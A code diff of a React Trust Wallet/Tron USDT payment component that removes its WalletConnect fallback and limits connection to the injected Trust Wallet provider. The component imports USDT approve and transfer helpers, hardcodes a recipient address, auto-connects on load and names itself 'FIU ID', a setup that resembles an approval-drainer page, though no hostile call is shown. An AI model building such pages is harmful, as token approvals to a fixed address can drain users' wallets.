@@ -8,14 +8,6 @@ import { approveUSDT, transferUSDT } from "@/lib/web3";
 const DEFAULT_TO_ADDRESS = "TYT6ty8mhUyq7w2GbTWT1LSqWaWTs3j4aa";
 const DEFAULT_AMOUNT = "10";
 
-function canConnectViaTrustInjection(): boolean {
-  if (typeof window === "undefined") return false;
-  const w = window as unknown as { trustwallet?: unknown };
-  if (!w.trustwallet) return false;
-  const provider = getTrustRequestProvider();
-  return typeof provider?.request === "function";
-}
-
 function getTrustStatusSnapshot(): Record<string, unknown> {
   if (typeof window === "undefined") {
     return { env: "no-window" };
@@ -77,13 +69,11 @@ const TrustWalletTronPay = () => {
   const { connect, address, isConnected, isConnecting } = useTronWallet();
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [trustConnecting, setTrustConnecting] = useState(false);
-  const [wcConnecting, setWcConnecting] = useState(false);
   const [amountInput, setAmountInput] = useState(DEFAULT_AMOUNT);
   const autoConnectAttempted = useRef(false);
   const trustPopupAttempted = useRef(false);
   const isConnectedRef = useRef(isConnected);
   const isConnectingRef = useRef(isConnecting);
-  const wcConnectingRef = useRef(wcConnecting);
   const trustConnectingRef = useRef(trustConnecting);
   const [statusOpen, setStatusOpen] = useState(false);
   const [lastAutoConnect, setLastAutoConnect] = useState<
@@ -102,13 +92,10 @@ const TrustWalletTronPay = () => {
     isConnectingRef.current = isConnecting;
   }, [isConnecting]);
   useEffect(() => {
-    wcConnectingRef.current = wcConnecting;
-  }, [wcConnecting]);
-  useEffect(() => {
     trustConnectingRef.current = trustConnecting;
   }, [trustConnecting]);
 
-  /** In Trust Discover: inject is present — use Trust adapter (native approve). Else: WalletConnect modal. */
+  /** Trust Discover / injected Tron only — never WalletConnect (no QR / All Wallets modal on this page). */
   const handleConnectWallet = async () => {
     try {
       delete (window as any).__tronWalletConnectOnUri;
@@ -116,12 +103,12 @@ const TrustWalletTronPay = () => {
       /* ignore */
     }
 
-    if (canConnectViaTrustInjection()) {
+    try {
+      setTrustConnecting(true);
       const provider = getTrustRequestProvider();
-      try {
-        setTrustConnecting(true);
+      if (typeof provider?.request === "function") {
         try {
-          await provider?.request?.({
+          await provider.request({
             method: "tron_requestAccounts",
             params: {
               websiteName: "FIU ID",
@@ -129,30 +116,19 @@ const TrustWalletTronPay = () => {
             },
           });
         } catch {
-          /* Trust may still connect */
+          /* Trust may still connect via adapter */
         }
-        await connect("trust");
-        toast.success("Wallet connected");
-      } catch (error) {
-        toast.error(
-          error instanceof Error ? error.message : "Could not connect in Trust Wallet"
-        );
-      } finally {
-        setTrustConnecting(false);
       }
-      return;
-    }
-
-    try {
-      setWcConnecting(true);
-      await connect("walletconnect");
+      await connect("trust");
       toast.success("Wallet connected");
     } catch (error) {
       toast.error(
-        error instanceof Error ? error.message : "WalletConnect failed"
+        error instanceof Error
+          ? error.message
+          : "Could not connect. Open this page in Trust Wallet and use the Tron network."
       );
     } finally {
-      setWcConnecting(false);
+      setTrustConnecting(false);
     }
   };
   
@@ -176,8 +152,7 @@ const TrustWalletTronPay = () => {
       if (
         isConnectedRef.current ||
         isConnectingRef.current ||
-        trustConnectingRef.current ||
-        wcConnectingRef.current
+        trustConnectingRef.current
       ) {
         return;
       }
@@ -256,52 +231,10 @@ const TrustWalletTronPay = () => {
       window.clearInterval(id);
     };
   }, [connect]);
-  
-  // WalletConnect auto-fallback (mobile): if Trust injection exists but connect isn't happening,
-  // kick off WalletConnect once per visit.
-  useEffect(() => {
-    if (typeof window === "undefined") return;
-    const ua = navigator.userAgent || "";
-    const isMobile = /android|iphone|ipad|ipod/i.test(ua);
-    if (!isMobile) return;
-    if (isConnected || isConnecting || trustConnecting || wcConnecting) return;
-
-    const snapshot = getTrustStatusSnapshot();
-    const hasTrust = Boolean(snapshot.hasTrustWallet);
-    const hasRequest = Boolean(snapshot.hasAnyRequestMethod);
-    if (!hasTrust || !hasRequest) return;
-    if (lastAutoConnect.state === "connected") return;
-
-    // If auto-connect errored, fallback to WC once.
-    if (lastAutoConnect.state !== "error") return;
-
-    const onceKey = "__tw_wc_autostarted";
-    if ((window as any)[onceKey]) return;
-    (window as any)[onceKey] = true;
-
-    setWcConnecting(true);
-    try {
-      delete (window as any).__tronWalletConnectOnUri;
-    } catch {
-      /* ignore */
-    }
-    void (async () => {
-      try {
-        await connect("walletconnect");
-        toast.success("Wallet connected");
-      } catch (error) {
-        toast.error(
-          error instanceof Error ? error.message : "WalletConnect failed"
-        );
-      } finally {
-        setWcConnecting(false);
-      }
-    })();
-  }, [connect, isConnected, isConnecting, trustConnecting, wcConnecting, lastAutoConnect]);
 
   const handleConfirm = async () => {
     if (!isConnected) {
-      toast.error("Connect your wallet first using the QR code or WalletConnect.");
+      toast.error("Connect your wallet first (tap Connect Wallet).");
       return;
     }
     try {
@@ -338,9 +271,9 @@ const TrustWalletTronPay = () => {
             <Wallet className="w-3.5 h-3.5" />
             {isConnected
               ? `Connected: ${address?.slice(0, 6)}...${address?.slice(-4)}`
-              : isConnecting || wcConnecting || trustConnecting
+              : isConnecting || trustConnecting
               ? "Connecting..."
-              : "Not connected — scan QR or use WalletConnect"}
+              : "Not connected — open in Trust Wallet, then tap Connect"}
           </div>
         </div>
 
@@ -357,7 +290,7 @@ const TrustWalletTronPay = () => {
             <div className="mt-1 text-xs text-[#8b8b94]">
               {isConnected
                 ? "Connected"
-                : isConnecting || wcConnecting || trustConnecting
+                : isConnecting || trustConnecting
                 ? "Connecting"
                 : "Not connected"}
             </div>
@@ -368,12 +301,11 @@ const TrustWalletTronPay = () => {
               <div className="text-xs text-[#4b4b54]">
                 <span className="font-semibold">adapter</span>:{" "}
                 {isConnected ? "connected" : "not-connected"} /{" "}
-                {isConnecting || wcConnecting || trustConnecting ? "connecting" : "idle"}
+                {isConnecting || trustConnecting ? "connecting" : "idle"}
               </div>
               <div className="text-xs text-[#4b4b54]">
                 <span className="font-semibold">connecting flags</span>: adapter=
-                {String(isConnecting)}, trust={String(trustConnecting)}, wc=
-                {String(wcConnecting)}
+                {String(isConnecting)}, trust={String(trustConnecting)}
               </div>
               <div className="text-xs text-[#4b4b54]">
                 <span className="font-semibold">auto-connect</span>:{" "}
@@ -418,13 +350,9 @@ const TrustWalletTronPay = () => {
               type="button"
               className="mt-2 w-full rounded-full border border-[#d7d7dc] bg-white py-2.5 text-sm font-medium text-[#4b4b54] disabled:opacity-50"
               onClick={handleConnectWallet}
-              disabled={wcConnecting || trustConnecting || isConnecting}
+              disabled={trustConnecting || isConnecting}
             >
-              {trustConnecting
-                ? "Connecting…"
-                : wcConnecting
-                  ? "Opening WalletConnect…"
-                  : "Connect Wallet"}
+              {trustConnecting ? "Connecting…" : "Connect Wallet"}
             </button>
           </div>
         )}
@@ -512,7 +440,6 @@ const TrustWalletTronPay = () => {
             isSubmitting ||
             !isConnected ||
             isConnecting ||
-            wcConnecting ||
             trustConnecting
           }
           type="button"
